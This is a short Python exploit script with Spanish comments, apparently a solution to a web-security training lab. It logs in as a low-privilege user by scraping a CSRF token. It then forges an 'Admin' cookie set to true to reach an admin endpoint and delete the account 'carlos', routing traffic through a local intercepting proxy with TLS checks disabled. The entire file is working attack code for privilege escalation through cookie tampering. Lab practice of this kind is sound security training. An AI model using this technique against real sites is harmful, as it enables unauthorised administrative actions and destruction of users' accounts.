import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    input_tag = soup.find("input", {"name": "csrf"})["value"]
    print(input_tag)
    return input_tag

def login(s, url):
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)
    
    credential = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    
    response = s.post(login_url, data=credential, verify=False, proxies=proxies)
    if "Log out" in response.text:
        print("[+] Login exitoso")
        return True
    else:
        print("[-] Login fallido")
        return False

def delete_user(s, url):
    
    if login(s, url):
        
        # Recibo la cookie de sesion
        session_cookie = s.cookies.get_dict().get('session')
        
        # Elimino el usuario en el panel de administracion
        delete_carlos_user = url + '/admin/delete?username=carlos'
        cookies = {
            'Admin':'true',
            'session': session_cookie,
        }
        
        r = s.post(delete_carlos_user, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] Usuario carlos eliminado")
        else:
            print("[-] Usuario no eliminado")      


def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
    
    s = requests.session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()